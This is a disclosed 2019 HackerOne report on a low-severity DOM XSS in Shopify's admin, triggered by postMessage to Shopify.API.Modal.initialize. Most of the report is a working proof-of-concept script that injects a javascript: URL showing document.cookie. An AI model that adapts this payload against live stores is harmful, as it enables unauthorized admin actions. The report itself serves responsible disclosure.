# DOM XSS via Shopify.API.Modal.initialize

## Report Details
- **Report ID**: 602767
- **URL**: https://hackerone.com/reports/602767
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-06-07T01:10:31.500Z
- **Disclosed**: 2019-06-21T18:28:11.960Z

## Reporter
- **Username**: tiago-danin
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Similar #422043 & #576532

Payload ( Based on #576532): 

```html
<script>
    function attack(){
        const ctx = window.open(location.origin+'/admin/themes', '_blank')
        const json = {
            message: "Shopify.API.Modal.initialize",
            data: {
                src: ""
            }
        }

        let interval;
        interval = setInterval(function(){
            if (window.attackSuccess) {
                clearInterval(interval)
            } else {
                ctx.postMessage(JSON.stringify(json)) // data.src == ""
                json.data.src = "javascript:alert(document.cookie)"
                ctx.postMessage(JSON.stringify(json))
            }
        }, 500)
    }
    attack()
</script>
<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
```

## Impact

Perform unauthorized actions on a store admin on any embedded apps.

## Attachments
No attachments
